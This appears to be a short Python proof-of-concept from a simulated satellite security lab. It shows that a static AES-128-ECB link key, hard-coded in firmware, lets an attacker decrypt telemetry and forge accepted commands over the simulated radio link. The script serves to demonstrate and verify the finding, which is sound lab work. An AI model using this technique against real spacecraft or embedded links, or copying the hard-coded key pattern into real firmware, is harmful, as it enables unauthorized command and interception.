#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


def main(dev, ev):
    # V0-02: AES-128-ECB secure link uses the static key "PWNsatLabKey1234"
    # (readable in the firmware strings). Anyone holding the image decrypts
    # all telemetry and encrypts valid commands.
    ev.log(f"key recovered from firmware image: {fs.LINK_KEY!r}")
    tms = dev.tc(0x0C, b"", via="radio")          # GET_STATUS (wrapped)
    st = dev.find(tms, 0x0C)
    check(st, "no status telemetry")
    check(st[0].wrapped, "status TM should be secure-wrapped")
    check(st[0].payload[0] == 0x01, "decrypted status must start with SC id")
    ev.log(f"decrypted GET_STATUS payload: {st[0].payload.hex()}")
    # and the attacker can also encrypt a valid command with the same key
    tms = dev.tc(0x03, b"", via="radio")
    check(dev.find(tms, 0x03), "encrypted TC with known key must be accepted")
    ev.log("attacker holding the firmware image speaks the link natively")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-02 static AES key 'PWNsatLabKey1234'", main))
